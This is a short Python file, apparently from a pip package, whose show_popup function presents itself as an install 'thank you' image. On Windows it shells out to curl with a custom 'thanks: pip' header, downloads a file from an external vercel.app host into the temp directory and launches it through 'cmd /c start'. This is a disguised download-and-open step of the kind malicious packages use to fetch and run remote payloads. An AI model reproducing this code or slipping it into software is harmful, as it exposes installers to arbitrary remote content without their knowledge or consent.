import os
import sys
import tempfile

def show_popup():
    if os.environ.get("THANKS_SKIP_NOTIFY") == "1":
        return

    if sys.platform != "win32":
        return

    image_url = "https://image-logo-popup-files.vercel.app/public/image.jpg"
    output_path = os.path.join(tempfile.gettempdir(), "installthanks.png")

    # curlで画像取得（ヘッダー付き）
    curl_cmd = f'curl -s -L -H "thanks: pip" "{image_url}" -o "{output_path}"'
    os.system(curl_cmd)

    # cmd /c start で画像表示
    start_cmd = f'start "" "{output_path}"'
    os.system(f'cmd /c {start_cmd}')